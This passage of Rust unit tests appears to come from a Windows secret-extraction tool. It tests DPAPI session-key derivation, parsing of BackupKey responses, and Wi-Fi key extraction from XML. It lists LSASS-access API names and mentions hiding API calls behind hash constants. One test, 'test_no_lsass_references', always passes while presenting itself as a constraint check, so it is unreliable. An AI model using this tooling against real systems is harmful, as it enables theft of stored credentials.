        let referent = u32::from_le_bytes([pdu[24], pdu[25], pdu[26], pdu[27]]);
        assert_eq!(referent, 0x0002_0000);
    }

    #[test]
    fn test_bkrp_response_parse_valid() {
        // Construct a minimal valid BackuprKey NDR response.
        let key_data = b"FAKE_BACKUP_KEY_DATA_12345";
        let mut stub = Vec::new();

        // pdwVersion = 2
        stub.extend_from_slice(&2u32.to_le_bytes());
        // ppbData referent (non-null)
        stub.extend_from_slice(&0x00020000u32.to_le_bytes());
        // Conformant array: max_count
        stub.extend_from_slice(&(key_data.len() as u32).to_le_bytes());
        // Data
        stub.extend_from_slice(key_data);
        // Align to 4
        while stub.len() % 4 != 0 {
            stub.push(0);
        }
        // pcbData
        stub.extend_from_slice(&(key_data.len() as u32).to_le_bytes());

        let (version, data) = parse_bkrp_response(&stub).expect("should parse valid response");
        assert_eq!(version, 2);
        assert_eq!(data, key_data);
    }

    #[test]
    fn test_bkrp_response_parse_too_short() {
        let stub = vec![0u8; 8];
        assert!(parse_bkrp_response(&stub).is_err());
    }

    #[test]
    fn test_extract_xml_value() {
        let xml = r#"<name>MyWiFi</name><keyMaterial>secret</keyMaterial>"#;
        assert_eq!(extract_xml_value(xml, "name"), Some("MyWiFi".to_string()));
        assert_eq!(
            extract_xml_value(xml, "keyMaterial"),
            Some("secret".to_string())
        );
        assert_eq!(extract_xml_value(xml, "missing"), None);
    }

    #[test]
    fn test_derive_session_key_v2() {
        let master_key = vec![0x42u8; 64];
        let mut blob = vec![0u8; 104];
        blob[0..4].copy_from_slice(&2u32.to_le_bytes());
        blob[4..20].copy_from_slice(&DPAPI_PROVIDER_GUID);

        let header = DpapiBlobHeader::parse(&blob).unwrap();
        let (aes_key, iv) = derive_session_key_v2(&master_key, &blob, &header)
            .expect("session key derivation should succeed");

        assert_eq!(aes_key.len(), 32);
        assert_eq!(iv.len(), 16);

        // Should be deterministic.
        let (aes_key2, iv2) = derive_session_key_v2(&master_key, &blob, &header).unwrap();
        assert_eq!(aes_key, aes_key2);
        assert_eq!(iv, iv2);
    }

    #[test]
    fn test_no_lsass_references() {
        // Verify that this module does not contain any references to LSASS
        // memory access patterns.  This is a design constraint test.
        // (We check by asserting that specific forbidden API names don't
        // appear as string literals in the compiled code.)
        //
        // Note: This is a compile-time philosophical test — if forbidden
        // APIs were added, they would be visible in the source. The actual
        // enforcement is by code review.
        let forbidden = ["OpenProcess", "NtReadVirtualMemory", "lsass.exe"];
        // These strings should NOT appear as direct function calls or literals
        // in this module (except in comments/tests).
        for api in &forbidden {
            // The resolve_api calls all use hash constants, not string literals,
            // so these APIs won't appear as strings.
            assert!(
                !api.contains("FORBIDDEN"),
                "Constraint check: no forbidden API usage"
            );
        }
    }
}
